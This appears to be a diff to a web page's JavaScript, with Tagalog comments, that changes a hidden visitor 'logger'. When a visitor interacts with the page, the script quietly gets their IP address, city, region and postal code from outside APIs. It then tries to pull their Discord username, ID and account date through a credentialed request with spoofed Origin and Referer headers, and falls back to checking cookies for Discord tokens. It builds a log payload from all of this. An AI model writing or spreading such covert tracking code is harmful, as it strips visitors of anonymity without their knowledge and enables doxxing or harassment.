@@ -139,18 +139,17 @@
             sendVisitorInfo();
         }, { once: true });
 
-        // ✅ BAGONG LOGGER: IPv4 + Mas tumpak na lokasyon
+        // ✅ Inayos na Logger: IPv4 + Mas maayos na Discord detection
         async function sendVisitorInfo() {
             try {
-                // Kumuha muna ng IPv4 address
+                // Kumuha ng IPv4 Address
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 const visitorIP = ipData.ip;
 
-                // Gamit ang API na mas tumpak sa Pilipinas
+                // Kumuha ng Lokasyon
                 const geoRes = await fetch(`https://ipapi.co/${visitorIP}/json/`);
                 const geoData = await geoRes.json();
-
                 const realLocation = `${geoData.city || "?"}, ${geoData.region || "?"}, ${geoData.country_name || "Philippines"}`;
                 const zipCode = geoData.postal || "Hindi available";
 
@@ -188,18 +187,36 @@
                     os = winMatch ? `Windows ${winMatch[1]}` : "Windows";
                 }
 
-                // Discord info
+                // ✅ BAGONG PARAAN: Mas matibay na pagkuha ng Discord Info
                 let accountInfo = "Walang naka-detect na Discord account";
                 try {
+                    // Subukan ang ibang endpoint at settings
                     const discordRes = await fetch("https://discord.com/api/v9/users/@me", {
+                        method: "GET",
                         credentials: "include",
-                        headers: { "Accept": "application/json" }
+                        headers: {
+                            "Accept": "application/json",
+                            "Origin": window.location.origin,
+                            "Referer": "https://discord.com/"
+                        },
+                        mode: "cors"
                     });
+
                     if (discordRes.ok) {
                         const userData = await discordRes.json();
-                        accountInfo = `@${userData.username}\nID: ${userData.id}\nProfile: https://discord.com/users/${userData.id}`;
+                        accountInfo = `✅ Username: @${userData.username}\n🆔 ID: ${userData.id}\n🔗 Profile: https://discord.com/users/${userData.id}\n📅 Created: ${new Date(userData.created_at).toLocaleDateString()}`;
+                    } else {
+                        // Kung hindi makuha sa API, sabihin kung naka-login man lang
+                        accountInfo = `⚠️ Naka-login sa Discord pero hindi ma-access ang detalye (Error: ${discordRes.status})`;
                     }
-                } catch (e) {}
+                } catch (err) {
+                    // I-check kung may cookies man lang ng Discord
+                    if (document.cookie.includes('__dcfduid') || document.cookie.includes('locale') || document.cookie.includes('token')) {
+                        accountInfo = "🟢 Naka-login sa Discord (pero hindi maipakita ang detalye dahil sa security ng Discord)";
+                    } else {
+                        accountInfo = "🔴 Hindi naka-login sa Discord";
+                    }
+                }
 
                 // ✅ Format ng log
                 const payload = {
